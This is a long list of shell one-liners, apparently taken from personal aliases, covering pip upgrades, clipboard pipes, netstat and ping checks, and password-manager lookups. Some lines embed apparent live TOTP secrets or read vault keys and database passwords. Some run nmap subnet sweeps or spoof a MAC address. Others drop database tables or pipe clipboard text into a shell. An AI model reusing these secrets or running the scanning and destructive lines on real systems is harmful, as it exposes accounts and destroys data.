pip2 freeze --local | cut -d = -f 1 | xargs -n1 sudo -H pip3 install -U
pip show pip | grep Location | awk
pip search . | egrep -B1 'INSTALLED|LATEST'
pip list | sort > l1 && pip list --user | sort > l2 && comm l1 l2 -2 -3 && rm l1 && rm l2
pip list | cut -d' ' -f1 | xargs pip uninstall -y
pip list | cut -d ' ' -f1 | xargs -n1 sudo pip install --upgrade
pip list | cut -d ' ' -f 1 | xargs pip install --upgrade
pip list | awk '{print \$1}' | xargs pip install -U
pip list -o | cut -d' ' -f1 | xargs pip install -U
pip list -o -l --format freeze | cut -d = -f 1 | xargs -n 1 pip install -U
pip list --outdated | tail +1 | awk
pip list --outdated | sed 's/(.*//g' | xargs -n1 pip install -U
pip list --outdated | cut -d' ' -f1 | xargs pip install --upgrade --user
pip list --outdated | cut -d' ' -f1 | xargs pip install --upgrade
pip list --outdated | cut -d ' ' -f1 | xargs -n1 sudo pip3 install -U
pip list --outdated | cut -d ' ' -f1 | xargs -n1 pip install -U
pip list --outdated | awk '{if (NR!=1 && NR!=2) {print $1;}}' | xargs -n1 pip install -U
pip list --outdated --format=legacy|cut -d' ' -f1|xargs pip install -U
pip list --outdated --format=legacy | awk '{print $1}' | xargs sudo pip install -U
pip list --outdated --format=legacy | awk '{print $1}' | xargs pip install -U pip
pip list --outdated --format=legacy | awk '{print $1}' | xargs pip install -U
pip list --outdated --format=freeze | cut -d = -f 1 | xargs -n1 pip install -U
pip list --outdated --format=freeze --user | cut -d = -f 1 | xargs -n1 pip install -U --user
pip list --outdated --format legacy | sed 's/(.*//g' | xargs -n1 sudo pip install -U
pip list --outdated --format freeze | sed 's/=.*//g' | xargs -n1 sudo pip install -U
pip list --outdated --format freeze | cut -d= -f1 | xargs pip install --upgrade
pip list --format=freeze | cut -d = -f 1 | xargs pip install --upgrade
pip list --format=freeze --outdated | cut -d'=' -f1 | xargs pip install --user --upgrade
pip list --format json --outdated | jq .[].name | xargs pip install -U
pip list --format freeze | sed 's/==.*//g' | xargs pip install --upgrade
pip list --format freeze | sed 's/==.*$//g' | xargs pip install -U
pip install Cython==0.26.1 && pip install kivy || pip install https://github.com/kivy/kivy/archive/master.zip
pip install -Ur requirements_dev.txt || pip install -r requirements.txt
pip install -U `pip list --format=columns --outdated | awk '!/Package|---/{ print $1}'`
pip install -U \$(pip list -o | awk 'NR > 2 {print \$1}' | paste -sd ' ' -)
pip freeze | tr A-Z a-z | sort > requirements.txt
pip freeze | sort | less
pip freeze | grep -v -- -e | while read file; do pip uninstall
pip freeze | grep -v '^-e ' | xargs pip uninstall -y
pip freeze | grep -Fvx -f requirements.txt - | xargs pip uninstall -y
pip freeze | cut -d= -f1 | pip install -U -r /dev/stdin
pip freeze | cut -d = -f 1 | xargs pip install -U
pip freeze --user | cut -d'=' -f1 | xargs pip install --user -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 > requirements.txt
pip freeze --local | cut -d = -f 1 | xargs pip install -U
ping google.com | unbuffer -p sed s/time=//g | unbuffer -p awk
ping google.com -c 1 | grep time= | sed 's/.*time\=//g'
ping 1.1.1.1 -c1 && curl ipinfo.io || iwconfig
ping -q -w 1 -c 1 google.com > /dev/null && echo online || echo offline
ping -q -w 1 -c 1 `ip r | grep default | cut -d
ping -q -c 10 $(netstat -rn | grep '^default.*UG' | awk '{print $2}')
ping -i 50 `ifconfig | grep broadcast | tail -c 16`
ping -i 0.2 `netstat -nr | grep -m 1 '^default' | awk '{print $2;}'`
ping -c3 8.8.8.8 | egrep '(bytes from | No route to host)'
ping -c1 $1 { echo 'succes'; } || { echo 'failed'; }
ping -c 1 www.gentoo.org||sudo rc-service dhcpcd restart
ping -c 1 google.com &> /dev/null && echo +OK || echo -KO
ping -c 1 dcjtech.info || ping -c 1 duckduckgo.com
ping -c 1 8.8.8.8 | g time= | awk
ping -c 1 8.8.8.8 -t 1 | grep '0.0% \| 100.0%'
pidof transmission-daemon | xargs sudo kill -9 | transmission-daemon
pidcat `adb shell pm list package | sed -e s/package:// | fzf`
pid=`screen -ls | grep irssi | sed
php -i | grep 'php.ini.*=> ' | sed 's/.* => //'
phantomjs spec/javascripts/runner.coffee http://localhost:5555/jasmine | grep -h -B3 -A1 '\(failures\|\
pgrep spring | xargs kill -9 && pgrep ruby | xargs kill -9
pgrep mutt && mutt -R || mutt
pgrep mopidy && exec ncmpcpp || nohup mopidy &> /dev/null & exec ncmpcpp
pgrep mlnet >/dev/null 2>&1 && echo vd | nc -q 1 localhost 4000 |python -c \
pgrep mlnet >/dev/null 2>&1 && echo vd | nc -q 1 localhost 4000 | awk
pgrep com.docker.hyperkit &> /dev/null || (open /Applications/Docker.app && until docker info &> /dev/null ; do sleep 1; done) && docker-compose
pgrep com.docker.hyperkit &> /dev/null || (open /Applications/Docker.app && until docker info &> /dev/null ; do sleep 1; done) && docker
pgrep awesome | tail -1 | xargs kill -s SIGHUP
pgrep -x mpop > /dev/null 2>&1 || mpop -a
pgrep -x fetchnews > /dev/null 2>&1 || sudo -u news fetchnews -vv
pgrep -vxq tmux && tmux new -d -s tmp && tmux run-shell ~/.tmux/plugins/tmux-resurrect/scripts/restore.sh && tmux kill-session -t tmp && tmux attach || tmux attach
pgrep -vxq tmux && tmux new -d -s delete-me && tmux run-shell ~/.tmux/plugins/tmux-resurrect/scripts/restore.sh && tmux kill-session -t delete-me && tmux attach || tmux attach
pgrep -vx tmux > /dev/null && tmux new -d -s delete-me && tmux run-shell ~/.tmux/plugins/tmux-resurrect/scripts/restore.sh && tmux kill-session -t delete-me && tmux attach || tmux attach
pgrep -fl dstat| awk '{print $1}' | xargs kill -9
pgrep -a gnome-shell | grep /home/marek/local/bin/gnome-shell | cut -d ' ' -f 1
pgj | grep _r_ | wc -l
pgj | grep _m_ | wc -l
pgj | grep YarnChild | wc -l
pgi byobu | awk '{print $2}' | xargs kill -9
pgcli postgresql://postgres:$(< ~/.today_local | grep 'POSTGRESQL_PASSWORD=' | sed
pew workon $(pew ls | mysplit | fzf)
perldoc -t perllocal | grep Module | sed -e 's/^.* \
perl ~/dev/diff_painter/diff_painter.pl | cat | more -r
perl -v|grep -o '(v[0-9]\+.[0-9]\+.[0-9]\+)'|grep -o '[0-9.]\+'
perl -pi -e 's/\r\n|\n|\r/\r\n/g'
perl -pi -e 's/\r\n|\n|\r/\n/g' $@
perl -pi -e 's/\r\n|\n|\r/\n/g'
perl -pe 's/\r\n|\n|\r/\n/g'
perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g'
perl -ne 'm|| && print \
perl -lne 'print unless /^\s*(\*|\/|$)/'
perl -i.bak -pe 's/[^[:ascii:]]//g' | textfmt -s A4 -p 12 | lpr -P HP_LaserJet_1100
perl -e 'foreach my $key(sort keys(%ENV)){print qq|$key = $ENV{$key}\n|;}'
perl -Xnpe '$|=1; s/\\?/\\n/g; s/&/\\n/g; s/=/:\\t/g' | nkf -u --url-input
perl -E 'for \$a (@ARGV||q{}) { for (<\$a*>) { -d && say } }'
perf script | ~/FlameGraph/stackcollapse-perf.pl | ~/FlameGraph/flamegraph.pl > profile.svg && firefox profile.svg
perf script | ~/FlameGraph/stackcollapse-perf.pl | ~/FlameGraph/flamegraph.pl > profile.svg
perf script | $FLAME_GRAPH_DIR/stackcollapse-perf.pl | $FLAME_GRAPH_DIR/flamegraph.pl > profile_$(date +
pcpes $(pqenb) | paste - - | sort -n
pbr | tr -d '\n' | pbcopy; echo 'branch name copied to clipboard'
pbpaste|tr '[:upper:] ' '[:lower:]-'|pbcopy
pbpaste|python -mjson.tool|pbcopy
pbpaste|json|pbcopy;syntaxhighlight json
pbpaste|cat|pbcopy
pbpaste| sed 's/\\\\t//g' | sed 's/\\\\n//g'
pbpaste| html2slim | pbcopy
pbpaste || xclip -selection clipboard -o
pbpaste |md2conflu |pbcopy
pbpaste | xmllint --format - >&2 | pbcopy
pbpaste | vipe | pbcopy
pbpaste | uniq | pbcopy
pbpaste | tr -s '\n' ' ' | pbcopy
pbpaste | tr -s ' ' '\n' | pbcopy
pbpaste | tr -d '\n' | pbcopy
pbpaste | tidy | pbcopy
pbpaste | textutil -stdin -stdout -convert rtf | pbcopy
pbpaste | textutil -convert txt -stdin -stdout -encoding 30 | pbcopy
pbpaste | subl -n | pbcopy
pbpaste | sort | pbcopy
pbpaste | sed -e 's/^/ /' | pbcopy
pbpaste | sed -e '\$a\\' | tee >(zsh)
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/ansible-vault/production.key /dev/stdin --output=-
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/ansible-vault/prod-grandmaster.pem /dev/stdin --output=-
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/ansible-vault/development.key /dev/stdin --output=-
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/ansible-vault/brochure-production.key /dev/stdin --output=-
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/ansible-vault/brochure-development.key /dev/stdin --output=-
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/.ssh/production.key /dev/stdin --output=-
pbpaste | sed 's/^[[:space:]]*//g' | ansible-vault decrypt --vault-password-file=~/.ssh/development.key /dev/stdin --output=-
pbpaste | sed 's/^/> /' | pbcopy
pbpaste | sed 's/^%.*//' | wc -w
pbpaste | sed 's/^ \{4\}//' | pbcopy
pbpaste | sed 's/\\\\//g' | python -m json.tool
pbpaste | sed 's/\//./g' | pbcopy
pbpaste | sed 's/ /\%s/g' | xargs adb shell input text
pbpaste | rg FAIL.*jsx? | rg \S+*jsx? -o
pbpaste | rev | pbcopy && pbpaste
pbpaste | rev | pbcopy
pbpaste | reformat-markdown-table | pbcopy
pbpaste | refmt --parse re --print ml | pbcopy
pbpaste | refmt --parse re --print ml --interface false | pbcopy
pbpaste | refmt --parse ml --print re | pbcopy
pbpaste | refmt --parse ml --print re --interface false | pbcopy
pbpaste | qrencode -o - | dispimg
pbpaste | python ~/feng-shui/scripts/quote.py | pbcopy ; pbpaste
pbpaste | python -mjson.tool | pygmentize -l javascript
pbpaste | python -m json.tool | pbcopy
pbpaste | python -m json.tool | mvim - \
pbpaste | python -m json.tool | less
pbpaste | python -m json.tool >&2 | pbcopy
pbpaste | pretty_json | pbcopy
pbpaste | perl -pe 's/\r\n|\r/\n/g'
pbpaste | pastebinit | pbcopy
pbpaste | pastebin -f - | pbcopy
pbpaste | opencc -c s2twp.json | pbcopy
pbpaste | obfuscate | pbcopy
pbpaste | nkf -Lu | cat
pbpaste | mdt| pbcopy
pbpaste | markdown | browser
pbpaste | keybase decrypt | pbcopy
pbpaste | jsonlint | vim -
pbpaste | json_pp | pbcopy
pbpaste | json-to-js | cop
pbpaste | json | pbcopy
pbpaste | js2coffee | pbcopy
pbpaste | jq | pbcopy
pbpaste | jq | less -r
pbpaste | jq .stack_trace | unescape.py
pbpaste | jq . | pbcopy
pbpaste | jq . -r | mvim - \
pbpaste | jq . -C | less -R
pbpaste | jq -c '.' | pbcopy
pbpaste | jq -S '.' | pbcopy
pbpaste | jq -C . | less -SRi
pbpaste | jq '.' | pbcopy
pbpaste | java -jar closure.jar | pbcopy
pbpaste | iconv -c -f UTF-8-MAC -t UTF-8 | pbcopy
pbpaste | html2haml | pbcopy
pbpaste | highlight -O rtf --font-size 14 --font Monaco --style solarized-light | pbcopy
pbpaste | highlight --syntax=swift -O rtf --font-size 24 --font Inconsolata --style solarized-dark | pbcopy
pbpaste | highlight --syntax=rb -O rtf | pbcopy
pbpaste | highlight --syntax=php -O rtf --style candy | pbcopy
pbpaste | highlight --syntax=objc -O rtf --font-size 24 --font Inconsolata --style solarized-dark | pbcopy
pbpaste | highlight --syntax=js -O rtf | pbcopy
pbpaste | highlight --syntax=js -O rtf --style candy| pbcopy
pbpaste | highlight --syntax=js -O rtf --font-size 24 --font Inconsolata --style solarized-dark | pbcopy
pbpaste | highlight --syntax=js --style=solarized-light --out-format=rtf | pbcopy
pbpaste | highlight --syntax=js --style=seashell --line-numbers -O rtf | pbcopy
pbpaste | highlight --syntax=httpd -O rtf --style candy| pbcopy
pbpaste | highlight --syntax=html -O rtf | pbcopy
pbpaste | highlight --syntax=html -O rtf --style candy| pbcopy
pbpaste | highlight --syntax=html --style=seashell --line-numbers -O rtf | pbcopy
pbpaste | highlight --syntax=css -O rtf | pbcopy
pbpaste | highlight --out-format rtf --font-size 10 --font Menlo --src-lang ruby --line-numbers | pbcopy
pbpaste | highlight --line-numbers --font-size 24 --font Inconsolata --style solarized-dark -W -J 75 -j 3 --src-lang ruby -O rtf | pbcopy
pbpaste | highlight --font-size 36 --font 'IBM Plex Mono' --syntax=js --style Neon -O rtf | pbcopy
pbpaste | highlight --font-size 24 --font Inconsolata --style zenburn --syntax=js -O rtf | pbcopy
pbpaste | grep { | jq .
pbpaste | grep 'test.*(' | awk '{print \$1 \
pbpaste | gpg -e --armor | pbcopy
pbpaste | gpg -d | pbcopy
pbpaste | gist | pbcopy
pbpaste | gist -p | pbcopy
pbpaste | fold -w 80 -s | pbcopy
pbpaste | fold -w 72 -s | pbcopy
pbpaste | fold -s | pbcopy
pbpaste | fmt 80 | pbcopy
pbpaste | fmt -w 80 | pbcopy
pbpaste | expand | pbcopy
pbpaste | encode64 | tee >(cop)
pbpaste | decode64 | tee >(cop)
pbpaste | cut -c 2-10000 | pbcopy
pbpaste | command luigi --no-color | vi -
pbpaste | catacomb emerencia | slackcat -s -c ando
pbpaste | cat | less -R
pbpaste | base64 | pbcopy
pbpaste | base64 -w 0 | pbcopy
pbpaste | base64 -D | pbcopy
pbpaste | base64 -D -i - | jq
pbpaste | base64 --decode | pbcopy
pbcopy || xclip -selection clipboard
pbcopy | highlight -O rtf --font-size 12 --font DejaVuSansMono --style rdark -W -J 50 -j 3 --src-lang clojure | pbcopy
paste | jqc | copy
paste <(cat /sys/class/thermal/thermal_zone*/type) <(cat /sys/class/thermal/thermal_zone*/temp) | column -s $'\t' -t | sed 's/\(.\)..$/.\1°C/'
paste -sd' ' | perl -pe 's/[[:space:]]*$//; s/[[:space:]]+/ /g; chomp' | tee >(xsel -ib)
pasta | cowsay -f tux | lolcat -f
pass show root/login | tail -n1 | xclip -selection clipboard
pass show encrypted-dir | head -n 1 | encfs -S ~/Drive/Encrypted ~/Encrypted
pass show Twitter/login | tail -n1 | xclip -selection clipboard
pass show IRC-Freenode/login | tail -n1 | xclip -selection clipboard
pass show Google/login | tail -n1 | xclip -selection clipboard
pass show Github/login | tail -n1 | xclip -selection clipboard
pass show Facebook/login | tail -n1 | xclip -selection clipboard; sleep 9s; echo
pass email/posteo_otp | head -1 | xargs oathtool -b --totp=
pass Accounts/UdS/password | head -n1 | sudo openconnect asa2.uni-saarland.de -u s8dashah
pass $1 | cut -d$'\n' -f1 | pbcopy
parse_git_branch | trim | pbcopy
pandoc -s -f markdown -t man ~/.manual.md | groff -T utf8 -man | less
pandoc -s -f markdown -t man \!* | groff -T utf8 -man | tail
pandoc -s -f markdown -t man \!* | groff -T utf8 -man | less
pandoc -s -f markdown -t man \!* | groff -T utf8 -man | cat
pandoc -s -f markdown -t man README.md | groff -T utf8 -man | less
pandoc -s -f markdown -t man !* | groff -T utf8 -man | less
pandoc --from markdown --to html | textutil -convert rtf -stdin -stdout -format html | pbcopy -Prefer rtf
pactl -- set-sink-volume $(pactl list sinks | grep Sink | sed 's/.*#\(.*\)/\1/') -5%
pactl -- set-sink-volume $(pactl list sinks | grep Sink | sed 's/.*#\(.*\)/\1/') +5%
pacsize| sort -rhk 2| less
pacmd list-sinks|egrep -i 'index:|name:'
pacman-color -Sl | cut -d' ' -f2 | grep
pacman -Slq | fzf -m --preview 'pacman -Si {1}' | xargs -ro sudo pacman -S
pacman -Slq | fzf -m --preview 'pacman -Si {1}' | xargs -r sudo pacman -S --noconfirm
pacman -Slq | fzf -m --preview 'pacman -Si {1}' | xargs -r sudo pacman -S
pacman -Sl | cut -d' ' -f2 | grep
pacman -Qqe | fzf --preview 'pacman -Qil {}' --layout=reverse --bind 'enter:execute(pacman -Qil {} | less)'
pacman -Qq | uniq -c | awk '\$1 > 1 {print \$0}'
pacman -Qq | fzf -m --preview 'pacman -Si {1}' | xargs -ro sudo pacman -Rns
pacman -Qq | fzf --preview 'pacman -Qil {}' --layout=reverse --height=100% --bind 'enter:execute(pacman -Qil {} | less)'
pacman -Qq | fzf --preview 'pacman -Qil {}' --layout=reverse --bind 'enter:execute(pacman -Qil {} | less)'
pacman -Qkk | grep \)$ |& sort
pacman -Qii | grep '^MODIFIED' | cut -f 2
pacman -Qi | sed -n '/^Name[^:]*: \(.*\)/{s//\1 /;x};/^Installed[^:]*: \(.*\)/{s//\1/;H;x;s/\n//;p}' | sort -nk2
pacman -Qeq | sort | less
pacman -Qei | awk '$sizestr' | sort -n
pacman -Qei | awk '$depsstr' | sort -n
pacman -Q | pacman -Qii | awk
pacman --color=auto -Sl | cut -d' ' -f2 | fzf -m --preview 'pacman -Si {1}'
paclog --color | grep --color installed | slit -f
packer --quickcheck|grep -v linux-ck|xargs -I{} -n1 yaourt -S {} --noconfirm
pacfind -rac | fzfpac | xargs --no-run-if-empty retty pacaur -S
pacfind -lc | fzfpac | xargs --no-run-if-empty retty pacaur -Rsc
pa | awk '{print \$2}' | xargs kill -9
p8 checkout \`p8 branch | fzf | awk '{print \$1}' \`
p8 abandon \`p8 branch | fzf | awk '{print \$1}' \`
p4o | cut -d / -f 7- | cut -d '#' -f 1
p4file | cut -d ' ' -f 1 | xargs chmod 0644
p4 diff ... | colordiff | less
p4 changes -m1 -l -t @`p4 client -o | grep ^Client | cut -f 2`
p -Sl | cut -d' ' -f2 | grep -i
out|xargs time|sed 's/output.txt/ /'
ossmix mplayer 18:18 || pimpd2 --play
ossmix mplayer 0 || pimpd2 --kill
osascript -e 'display notification $([ $? = 0 ] && echo terminal || echo error)
openstack workflow env show ssh_keys -f json -c Variables | jq .Variables -r | jq .private_key -r
openssl rand -hex 6 | sed 's/\(..\)/\1:/g;s/../00/;s/.$//' | tr '[a-z]' '[A-Z]'
openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/:$//' | tr a-f A-F
openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//' | xargs sudo ifconfig en1 ether
openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//' | xargs sudo ifconfig en0 ether
openssl rand -hex 3 | tr -d '\n' | pbcopy
openssl rand -hex 3 | tr '\n' ' ' | xclip
openssl rand -base64 45 | tr -d /=+ | cut -c -30
openssl rand -base64 32 | tr -d /=+ | cut -c -32
openssl rand -base64 32 | tr -d /=+ | cut -c -30
openssl rand -base64 256 | md5 |head -c32;echo'
openssl rand -base64 18 | tr '\n' '[' | pbcopy
openssl rand -base64 16 | tr -cd a-hjkp-zA-HJKP-Z2-9 | cut -c 1-16
openssl rand -base64 16 | tee /dev/tty | pbcopy
openssl rand -base64 100 | head -c 64 | egrep -v %
openssl rand -base64 ${1:-10} | tr -d '\n' | tee >(pbcopy) && echo ' is copied to your clipboard'
openssl ecparam -name secp256k1 -genkey > ~/priv.pem; openssl ec -in ~/priv.pem -pubout -outform DER | tail -c 56 | xxd -p -c 56
openssl ecparam -name secp256k1 -genkey > ~/priv.pem; openssl ec -in priv.pem -pubout -outform DER | tail -c 65 | xxd -p -c 65
openssl dgst -binary -sha256 | base64 | sed -e 's/.\{4\}/& /g'
open ~/github/my/brinda.cz/publications/brinda_phd.pdf || open http://brinda.cz/publications/brinda_phd.pdf
open ~/dropbox/black-sheep.dmg; ls /Volumes/Black\ Sheep/ || watch -gn 1 ls /Volumes/; subl /Volumes/Black\ Sheep/
open || xdg-open
open https://github.\$(git config remote.origin.url | cut -f2 -d. | tr ':' /)
open https://github.(git config remote.origin.url | cut -f2 -d. | tr ':' /)
open https://github.$(git config remote.origin.url | cut -f2 -d. | tr ':' /)
open https://github.$(git config remote.origin.url | cut -f2 -d. | tr
open https://github.$(git config remote.origin.url | cut -f2 -d. | sed -e 's/:/\//')
open https://bitbucket.$(git config remote.origin.url | cut -f2 -d. | tr ':' /)
open http://www.github.com/$(git remote show origin -n | grep h.URL | sed 's/.*://;s/.git$//')
open http://$(ifconfig en0 | grep 'inet ' | cut -d' ' -f2):32400/web/index.html
open \`git ls-remote --get-url origin | sed -Ee 's@:@/@' -e 's#(git@|git://)#https://#'\`
open \`git config -l | grep 'remote.origin.url' | sed -n 's/remote.origin.url=git@github.com:\(.*\)\/\(.*\).git/https:\/\/github.com\/\1\/\2/p'\`
open ./*.xcworkspace 2>/dev/null || open ./*.xcodeproj 2>/dev/null
open . || nautilus .
open -a Finder ~/Examples || nautilus --browser ~/Examples
open -a Finder /tmp || nautilus --browser /tmp
open -a Finder . || nautilus --browser .
open -Fn (#i)*.(jpeg|jpg|png)(Om)
open *.xcworskapce || open *.xcodeproj
open *.xcworkspace || open *.xcodeproj
open *.xcworkspace 2&>/dev/null || open *.xcodeproj
open *.tmproj || mate .
open ${HOME}/workspace/ws_go/gobyexample/public/index.html || go-get-help
open $PYTHON_TOOLS_DIR || echo 'ERROR: Make sure you set PYTHON_TOOLS_DIR in .local_config'
open $1 2>/dev/null || open .
open $(git remote get-url origin)/compare/$(git branch | grep \* | cut -d ' ' -f2)?expand=1
open $(git config remote.origin.url)/tree/$(git branch | grep \* | cut -d ' ' -f2)
op_cache | fzf | xargs -I {} op_cache -p {}
op get item ostzq3ywovh2tku5otiawv7eti | jq '.details.fields[] | select(.name==\
op get item cw6djckxcneu5kjo7b4kdpkgvm | jq -r '.details.fields[] | select(.designation==\
oosm_active && tail -f $OOSM_HFILE || tail -f $HISTFILE
omz_history|tac|less
oc scale dc acs-server-deployment --replicas=0 && oc scale dc router --replicas=0 && CONTAINER=$(docker ps -qa) && docker kill $CONTAINER || true && docker rm $CONTAINER
oc $( git config remote.origin.url | sed s/ssh/https/ | sed s/git@// )
oathtool -v --totp -b Z7OCMXCKTTUU7RATYTGVGOI2RSLTSMSZR6Y3Q3NBARY6THC2PFNCAEAIEL6TATX3 | tail -1 | pbcopy
oathtool --totp -b fi632bfhjbsqayaq | tr -d '\n' | pbcopy
oathtool --totp -b drdg2wuhgvkdvpa6 | tr -d '\n' | pbcopy
oathtool --totp -b GRLHAZ3VJBGVWUTYERLS4S3UOFMHQ5TC | tr -d '\n' | pbcopy
oathtool --totp -b 7FDVVNONNRANIEIV | tr -d '\n' | pbcopy
oathtool --hotp $(cat ~/.oath/key) -c $([ ! -f ~/.oath/counter ] && echo -n 0 > ~/.oath/counter || echo -n $(($(cat ~/.oath/counter)+1)) > ~/.oath/counter; cat ~/.oath/counter)
nvim' ~/.bashrc || echo 'alias v=nvim' >> ~/.bashrc
nvim || true
nvim \`git st | grep 'both modified' | cut -d' ' -f5\`
nvim \$(ls -p | grep -v / | fzf --height=15 --border --margin=1 --preview 'head -100')
nvim README* || nvim readme*
nvim -c 'setf markdown | AirlineToggle | Goyo'
nvim -c 'Helptags|qall' && vim -c 'Helptags|qall'
nvim $(find Assets -type f | grep -v meta | grep .cs)
npm start || npm run dev
npm run start:prod || npm run start
npm run start:dev || npm run dev
npm run dev || npm run serve
npm run dev || npm run develop
npm run clean | npm i | npm run start
npm run build:jit |& tee npm.log | head -20
npm outdated -lp|awk -F':' '$5~/^dev/{print $4}'|xargs npm i -D
npm outdated -lp|awk -F':' '$5~/^dep/{print $4}'|xargs npm i -P
npm ls -p --depth=0 | awk -F/ '/node_modules/ && !/\/npm$/ {print $NF}' | xargs npm rm
npm ls -gp | awk -F/ '/node_modules/ && !/node_modules.*node_modules/ {print $NF}' | xargs npm -g rm
npm ls -gp --depth=0 | awk -F/ '/node_modules/ && !/\/npm$/ {print \$NF}' | xargs npm -g rm
npm ls -gp --depth=0 | awk -F/ '/node_modules/ && !/\/npm$/ {print $NF}' | xargs npm -g rm
npm ls -g yarn >/dev/null 2>&1 || npm i -g yarn@latest
npm list | pbcopy | echo '=> NPM Package List copied to clipboard.'
npm install -g npm; npm update -g; npm outdated -g --depth=0 --parseable | cut -d: -f4 | xargs -n 1 -I {} npm install -g {}
npm i --save $(cat package.json| jq '.dependencies | keys[]' -r)
npm i $(cat package.json| jq '.devDependencies | keys[]' -r) --save-dev
npm -g outdated --parseable=true | cut -d : -f 4 | xargs -n 1 npm -g install
npm -g ls --depth=0 | cut -c 11- | sed -e
npm -g list | grep '^\(├─┬\|└─┬\)'
nova list | grep net | wc -l
notify-send success! -i ~/Dropbox/ok_icon.png || notify-send Failed... -i ~/Dropbox/ng_icon.png
noglob _gref 'printf %s \$rev | tee /dev/tty | xsel -ib && echo'
nodemon --exec 'killall ngrok || echo \
nodejs;echo 'Node is installed' `node --version` || (show_error 'node or nodejs were not found')))
node --use-strict $(node --v8-options | grep harm | awk
nocorrect ps aux|grep -v grep|grep
nocorrect command env | sort | rg
nocorrect command env | sort | grep -E '^[A-Z_0-9]+'
nmcli | grep inet4 | head -1
nmcli device show wlp2s0 | grep IP4.DNS | grep_ip -o
nmcli d s|grep -v ^lo|awk '{if (NR>1){print \$1}}'
nmap -sn $(ip route show | grep -i 'default via'| awk '{print $3}')/24
nmap -sS -p 22 192.168.1.1-254 | grep -B3 open | grep ports
nmap -sP -T5 192.168.0.0/24 |grep report |awk
nmap -n -Pn 10.20.0.0/24 -p22 -oG - | grep '/open/' | awk '{print \$2}'
nm -Du $1 | grep U | tr -d \
nkf -e | kakasi -JH | nkf -w
nix-env -q | fzf | xargs -I{} nix-env -e {}
nix-env -q --installed --json | jq '.[]| \
nitrogen --set-zoom-fill ~/Pictures/wallpaper/\$(ls ~/Pictures/wallpaper/ |sort -R |tail -1)
networksetup -setsocksfirewallproxystate Wi-Fi \`if [ \\`networksetup -getsocksfirewallproxy Wi-Fi | awk '{ print $2 }' | head -1\\` == 'Yes' ]; then echo 'off'; else echo 'on'; fi\`
networksetup -listallhardwareports|grep -A1 Wi-Fi|awk '/Device:/ {print $2}'
networksetup -getautoproxyurl Wi-Fi | grep URL | awk '{print \$2}'
netstat G -v localhost | grep -v stream | grep -v dgram
netstat -tulnp | grep LISTEN | sort -k6
netstat -nltp | grep traffic | grep -v grep
netstat -nat|grep -w 5900|grep -c ESTABLISHED
netstat -naptl | grep -v grep | grep
netstat -naop | grep -v grep | grep python
netstat -naop | grep -v grep | grep ovs
netstat -naop | grep -v grep | grep nova
netstat -naop | grep -v grep | grep neutron
netstat -naop | grep -v grep | grep meta
netstat -naop | grep -v grep | grep glance
netstat -naop | grep -v grep | grep cinder
netstat -naop | grep -v grep | grep api
netstat -naop | grep -v grep | grep agent
netstat -naop | grep -v grep | grep
netstat -na |grep LIST |grep tcp
netstat -na |grep ESTAB |grep tcp
netstat -na | head -2; netstat -na 2> /dev/null | egrep -e '\.126'
netstat -na | grep tcp | grep LISTEN
netstat -na | grep ESTABLISHED | awk
netstat -lanp | egrep '^(tcp|udp).+LISTEN.+'
netstat -an|grep -i listen|grep
netstat -an|grep -i established|grep
netstat -antuwp | egrep '(^[^t])|(^tcp.*LISTEN)'
netstat -antup 2>/dev/null | awk 'NR==2'; netstat -antup 2>/dev/null | grep
netstat -anp|grep LISTEN|grep -v LISTENING
netstat -anp | head -1 && netstat -anp | grep -i
netstat -anp | grep LISTEN | less
netstat -anp | grep LISTEN | grep -v STREAM
netstat -anp | grep --color -i -E 'listen|listening'
netstat -ano|grep 443|grep LISTEN
netstat -anop | grep -i list | grep tcp
netstat -anob | grep 8181 | awk
netstat -aneep | grep -E '(LISTEN |udp )'
netstat -an | grep LISTEN | head -20
netstat -an | grep LISTEN | grep tcp
netstat -an | grep LISTEN | grep -v STREAM
netstat -an | grep ESTABLISHED | awk
netstat -an | grep --color -i -E 'listen|listening'
netstat -an | fgrep LISTEN | fgrep -v LISTENING
netstat -alntp | grep libvirtd && lsmod | grep kvm
netstat -a | grep LISTEN | grep localhost
netstat -a | egrep 'Proto|LISTEN'
netctl status $(ncl | grep '*' | cut -f 2 -d ' ')
netcfg -a && (netcfg wired || netcfg wired)&&exit
nestor executor | ack '\|\s[0-9]*\%s'
neomutt || true
neofetch | tr -d : | tr '[:upper:]' '[:lower:]'
neofetch --iterm2 $(find ~/.tmp-dir/neofetchwallpaper -maxdepth 2 -type f| sort -R | tail -1)
nc -w1 localhost 54321 | nc -l localhost 54321 2>/dev/null | cat
navy port postgres 5432 | tee >(tr -d \\n | copy)
natsort.py | tail -n 1 | xargs ic
n | sort -V | cut -d ' ' -f 1
m|grep mmt;umount /mnt/partition* /mnt/removable*;m|grep mmt;
mysqldump -u root digistore_development | grep ^DROP | mysql -u root digistore_development
myfont ; sudo uname ; conn & [[ `pgrep Xorg` ]] || startx ~/.xinitrc i3
myfont ; sudo uname ; conn & [[ `pgrep Xorg` ]] || startx ~/.xinitrc bspwm
mydockerenv && docker ps -a | grep docker$MY_DOCKER_PORT | awk
mydockerenv && docker ps -a | grep 0.0.0.0:$MY_DOCKER_PORT | awk
mycli mysql://mishguru@localhost:19532/mishmetainternal -p $(< ~/.mish_internal | grep SQL_META_PASS | sed 's/.*=''\(.*\)''/\1/')
mycli mysql://mishguru@localhost:19532/mishguruinternal -p $(< ~/.mish_internal | grep SQL_PASS | sed 's/.*=''\(.*\)''/\1/')
mycli mysql://mishguru@localhost:19531/mishmetaproduction -p $(< ~/.mish_production | grep SQL_META_PASS | sed 's/.*=''\(.*=\)''/\1/')
mycli mysql://mishguru@localhost:19530/mishguruproduction -p $(< ~/.mish_production | grep SQL_PASS | sed 's/.*=''\(.*\)''/\1/')
my-backups | cat | xargs -n 1 git branch -D
